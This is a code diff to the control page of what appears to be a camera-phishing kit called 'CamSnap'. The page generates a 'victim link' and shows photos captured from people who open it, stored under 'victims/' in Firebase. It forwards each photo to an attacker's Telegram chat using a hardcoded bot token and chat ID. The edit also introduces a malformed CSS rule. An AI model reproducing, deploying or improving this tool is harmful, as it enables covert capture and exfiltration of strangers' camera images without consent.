@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SnapCam - Free Online Camera Capture & Webcam – রিয়েল টাইম ফিল্টার</title>
+<title>CamSnap - Free Online Camera Capture & Webcam</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -15,7 +15,7 @@ header{background:#fff;padding:5px 0;text-align:center;box-shadow:0 2px 10px rgb
 h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
 p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90%}
 .btn{background:#3b82f6;color:#fff;padding:14px 40px;font-size:1.1em;border:none;border-radius:50px;cursor:pointer;margin:15px auto;display:block;width:90%;max-width:350px;font-weight:600;box-shadow:0 8px 20px rgba(59,130,246,0.3);transition:.3s}
-.btn:hover{transform:translateY(-3px)}
+.btn:hover{transform-translateY(-3px)}
 #linkBox{display:none;margin:30px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.1);border:2px dashed #3b82f6;width:90%;max-width:400px}
 #victimLink{width:100%;padding:14px;font-size:1em;background:#eff6ff;border:2px solid #3b82f6;border-radius:12px;color:#1e40af;text-align:center;margin:12px 0;word-break:break-all;font-weight:600}
 .gallery{margin-top:40px;padding:10px}
@@ -25,22 +25,15 @@ p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90
 .card:hover{transform:translateY(-6px)}
 .card img{width:100%;height:180px;object-fit:cover;border-bottom:4px solid #3b82f6}
 .time{background:#3b82f6;color:#fff;padding:8px;font-size:0.8em;text-align:center;font-weight:600}
-.delete-btn{
-  position:absolute;top:8px;right:8px;background:#ef4444;color:#fff;width:32px;height:32px;border-radius:50%;
-  display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;
-  box-shadow:0 2px 10px rgba(0,0,0,0.3);opacity:0.9;z-index:10
-}
+.delete-btn{position:absolute;top:8px;right:8px;background:#ef4444;color:#fff;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;box-shadow:0 2px 10px rgba(0,0,0,0.3)}
 .delete-btn:hover{background:#dc2626}
 .noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
 footer{background:#fff;padding:30px;text-align:center;color:#64748b;font-size:0.9em;border-top:1px solid #e0e7ff;margin-top:60px}
-footer a{color:#3b82f6;text-decoration:none;font-weight:600}
 </style>
 </head>
 <body>
 
-<header>
-  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/e78f33c9714e8c7f7a4af4183ce8d6f4e506c4d1/20251201_102630.png" alt="Logo" class="logo">
-</header>
+<header><img src="https://raw.githubusercontent.com/shakib0122222/camnei/e78f33c9714e8c7f7a4af4183ce8d6f4e506c4d1/20251201_102630.png" alt="Logo" class="logo"></header>
 
 <div class="container">
   <img src="https://files.catbox.moe/iqmhky.jpg" alt="Demo" class="thumb">
@@ -62,12 +55,11 @@ footer a{color:#3b82f6;text-decoration:none;font-weight:600}
   </div>
 </div>
 
-<footer>© 2025 COPYRIGHT BY <a href="#">X4XOR</a></footer>
+<footer>© 2025 COPYRIGHT BY X4XOR</footer>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// তোমার টেলিগ্রাম বট
 const BOT_TOKEN = "8214148154:AAH5jfutrpIUR5NxR1Ed522IysoLhQ6YhWY";
 const CHAT_ID = "7731349577";
 
@@ -76,7 +68,6 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 let currentId = localStorage.getItem("currentCamId") || null;
-let sentPhotos = JSON.parse(localStorage.getItem("sentPhotos") || "{}");
 
 if(currentId){
   document.getElementById("linkBox").style.display = "block";
@@ -87,9 +78,6 @@ if(currentId){
 function generateLink(){
   currentId = Date.now().toString(36);
   localStorage.setItem("currentCamId", currentId);
-  sentPhotos[currentId] = [];
-  localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
-  
   const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
@@ -104,26 +92,18 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-// ম্যানুয়াল ডিলিট
-function deletePhoto(photoKey){
-  if(!currentId) return;
-  db.ref("victims/"+currentId+"/"+photoKey).remove();
+function deletePhoto(key){
+  db.ref("victims/"+currentId+"/"+key).remove();
 }
 
-// টেলিগ্রামে শুধু নতুন ছবি পাঠাবে
-async function sendToTelegramIfNew(base64, photoTime){
-  if(!currentId || sentPhotos[currentId].includes(photoTime)) return;
-  sentPhotos[currentId].push(photoTime);
-  localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
-
+async function sendToTelegram(base64){
   try{
     const blob = await (await fetch(base64)).blob();
     const file = new File([blob], "photo.jpg", {type:"image/jpeg"});
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', file);
-    form.append('caption', `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
-
+    form.append('caption', `নতুন ছবি!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
   }catch(e){}
 }
@@ -134,25 +114,17 @@ function loadPhotos(id){
     const key = s.key;
     const data = s.val();
     if(!data?.data) return;
-    document.getElementById("nonoimg").style.display = "none";
-
+    document.getElementById("noimg").style.display = "none";
     const card = document.createElement("div"); card.className = "card";
     card.innerHTML = `
       <img src="${data.data}" onclick="window.open('${data.data}')">
       <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
-      <div class="delete-btn" onclick="deletePhoto('${key}');this.parentElement.remove()">🗑</div>
+      <div class="delete-btn" onclick="deletePhoto('${key}');this.parentElement.remove()">Trash</div>
     `;
     document.getElementById("grid").appendChild(card);
-
-    sendToTelegramIfNew(data.data, data.time);
+    sendToTelegram(data.data);
   });
-
-  setTimeout(()=>{
-    ref.remove();
-    localStorage.removeItem("currentCamId");
-    delete sentPhotos[id];
-    localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
-  }, 3600000);
+  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
 }
 </script>
 </body>
